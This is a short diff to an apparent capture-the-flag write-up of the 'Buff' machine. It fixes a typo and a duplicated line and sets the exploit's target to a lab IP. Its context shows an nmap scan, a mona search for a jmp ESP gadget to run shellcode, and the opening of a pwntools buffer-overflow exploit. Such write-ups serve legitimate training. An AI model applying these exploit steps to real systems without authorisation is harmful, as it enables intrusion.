@@ -299,7 +299,6 @@ sudo nmap -sS --min-rate 5000 -p8888 -vvv -n -Pn 192.168.1.11
 <img src="{{ site.img_path }}/buff_writeup/Buff_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br /><br />
 
-and also for the Windows machine and check that everything works correctly.
 First I download **[chisel](https://github.com/jpillora/chisel){:target="_blank"}** for my **Linux** attacking machine and also for the **Windows** virtual machine and check that everything works correctly.
 
 ```bash
@@ -713,7 +712,7 @@ Now I modify my script, and I write in the **EIP** register the address, in **Li
 
 # jmp ESP --> ASSEMBLY X86 --> ff e4
 !mona find -s "\xff\xe4" -m Qt5Core.dll
-# --> {PAGE_EXECUTE_READ}!! to execute shelcode inmediatly      :)
+# --> {PAGE_EXECUTE_READ}!! to execute shellcode inmediatly      :)
 # c (Enter expression to follow) : 0x68A98A7B
 # Breakpoint -> toggle
 ```
@@ -982,7 +981,7 @@ from pwn import *
 from struct import pack
 
 # Global Variables
-victime_machine = "127.0.0.1"
+victime_machine = "10.10.10.198"
 
 def executeExploit():
 
